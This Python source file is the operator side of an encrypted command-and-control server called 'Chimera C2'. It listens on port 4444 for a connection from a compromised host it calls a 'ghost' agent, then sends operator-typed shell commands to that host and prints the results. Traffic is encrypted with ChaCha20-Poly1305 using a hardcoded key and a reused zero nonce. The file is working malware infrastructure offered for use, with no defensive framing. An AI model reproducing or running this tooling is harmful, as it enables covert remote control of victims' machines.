import socket
import sys
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305

# --- [ CONFIGURATION ] ---
KEY = b"CHIMERA_PROJECT_2026_SECRET_KEY!"
CIPHER = ChaCha20Poly1305(KEY)
NONCE = b"\x00" * 12 

def run_c2():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        s.bind(('0.0.0.0', 4444))
        s.listen(1)
        print("\n[+] Chimera C2: Crypto-Listener Active")
        print("[*] Waiting for ghost connection...")
        
        conn, addr = s.accept()
        conn.settimeout(15.0) 
        print(f"[!] Ghost Connection established from {addr[0]}")
        
        while True:
            try:
                cmd = input("chimera_shell# ").strip()
                if not cmd: continue
                
                # Prevent "Quote-of-Death" hangs
                if (cmd.count('"') % 2 != 0) or (cmd.count("'") % 2 != 0):
                    print("[!] Error: Unclosed quotes detected. Aborting to protect agent.")
                    continue

                encrypted_cmd = CIPHER.encrypt(NONCE, cmd.encode(), None)
                conn.send(encrypted_cmd)

                if cmd.lower() == "exit":
                    print("[*] Closing connection.")
                    break

                data = conn.recv(32768) 
                if data:
                    try:
                        decrypted = CIPHER.decrypt(NONCE, data, None)
                        print(decrypted.decode(errors='replace'))
                    except Exception as e:
                        print(f"[!] Decryption Failure: {e}")
                else:
                    print("[!] Connection lost or no data returned.")
                    break
                    
            except socket.timeout:
                print("[!] Timeout: Agent is busy or hung.")
            except EOFError:
                break
            except Exception as e:
                print(f"[!] Runtime Error: {e}")

    except KeyboardInterrupt:
        print("\n[*] Manual Shutdown.")
    finally:
        s.close()

if __name__ == "__main__":
    run_c2()
